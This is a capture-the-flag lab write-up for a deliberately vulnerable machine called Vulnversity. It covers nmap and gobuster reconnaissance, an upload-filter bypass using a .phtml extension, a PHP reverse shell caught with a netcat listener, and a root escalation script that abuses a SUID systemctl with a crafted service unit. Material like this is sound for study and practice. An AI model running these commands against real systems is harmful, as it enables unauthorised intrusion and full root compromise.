#CTF
Nothing is displayed here for me so lelt's get right into it!

## Recon

The room is very helpful and suggests we run  [[Nmap]] with:
`nmap -sV [ip]`
And we get:

```
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:25:29:0E:72:4B (Unknown)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Just for the fun of ( and maybe we will need it later) , i will run it again with `--script=vuln`
```
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|          
```


## [[Gobuster]]

For Nmap we saw that there is a http server, so we will use Gobuster to locate the subdirectories
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://[ip]:[port of http]`
And we get: 
```
/images (Status: 301)
/js (Status: 301)
/css (Status: 301)
/internal (Status: 301)
```


## Attack

We head to /internal page and we are greeted with an upload form.
We would love to upload a reverse shell but .php files are blocked.
To find out what extensions are allowed we will use [[Burpsuite]].
First we open Burpsuite and start capturing trafiic, then on the browser we start the extension and we upload a file. We submit and capture the request. We send it on Intruder and we analize.
We want to find what extension to use so we add brackets there:
![](https://i.imgur.com/6dxnzq6.png)

On the payloads we upload a file with many php extensions 
![](https://i.imgur.com/ED153Nx.png)

The valid extension is .phtml!

Now we need to download a reverse shell and we can find one here https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

We edit the file and change the IP with our local.
Then we change the extension fron .php to .phtml
Next we upload the the reverse shell via the form and head to /internal/uploads and we can see our file.

Before we click it we need to open a [[Introductory Networking#Netcat]] connection with
`nc -lvnp 1234`
Then we click our file and Netcat caught the connection!

We look around and we see that the user's name is Bill and inside their directory we find a flag!

## Privilege Escalation

 Next we need to become super user!
 We will go about it with SUID (**set owner userId upon execution**)
 We have to seach for all the files with SUID with
 `find / -user root -perm -4000 -exec ls -ldb {} \;`
 We look around and we spot a curius file named
 `/bin/systemctl` that maybe we have access to.
 After some searching on the internet I found this on
 ```
TF=$(mktemp).service  
echo '[Service]  
Type=oneshot  
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"  
[Install]  
WantedBy=multi-user.target' > $TF  
./systemctl link $TF  
./systemctl enable --now $TF
```

Which outputs the content in the /tmp/output file. To gain access we have to change this line
`ExecStart=/bin/sh -c “chmod +s /bin/bash”`
And we are in!

